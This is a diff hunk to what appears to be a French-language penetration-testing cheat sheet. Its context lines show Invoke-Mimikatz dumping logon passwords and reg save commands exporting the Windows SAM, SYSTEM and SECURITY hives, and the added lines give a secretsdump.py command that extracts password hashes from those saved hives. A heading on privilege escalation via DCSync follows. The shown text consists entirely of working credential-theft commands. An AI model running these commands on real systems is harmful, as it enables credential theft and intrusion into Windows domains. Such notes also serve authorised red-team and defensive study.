@@ -144,6 +144,9 @@ Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
 reg save HKLM\SAM sam.save
 reg save HKLM\SYSTEM system.save
 reg save HKLM\SECURITY security.save
+
+#and to dump:
+secretsdump.py -sam '/path/to/sam.save' -security '/path/to/security.save' -system '/path/to/system.save' LOCAL
 ```
 ### Élévation de privilèges via DCSync
 ```powershell
